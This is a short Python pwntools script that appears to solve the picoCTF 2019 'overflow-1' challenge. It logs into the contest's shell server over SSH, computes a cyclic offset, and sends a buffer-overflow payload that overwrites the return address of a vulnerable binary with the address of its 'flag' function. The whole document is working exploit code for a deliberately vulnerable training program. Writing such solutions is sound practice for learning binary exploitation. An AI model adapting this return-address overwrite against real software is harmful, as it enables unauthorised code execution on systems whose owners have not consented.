from pwn import *
s = ssh(host='2019shell1.picoctf.com', user='', password='')
sh = s.process('vuln', cwd='/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389')

#stdout = process.PTY
#stdin = process.PTY

#sh = process('./vuln', stdout=stdout, stdin=stdin)

# Get offset
cyc_offset = cyclic_find(0x61746161)

# get ret addr
vuln = ELF('./vuln')
flag_addr = p32(vuln.symbols['flag'])

# create payload
payload = cyclic(cyc_offset+2) + flag_addr
print(payload)

# send payload
sh.sendlineafter(':', payload)
sh.interactive()
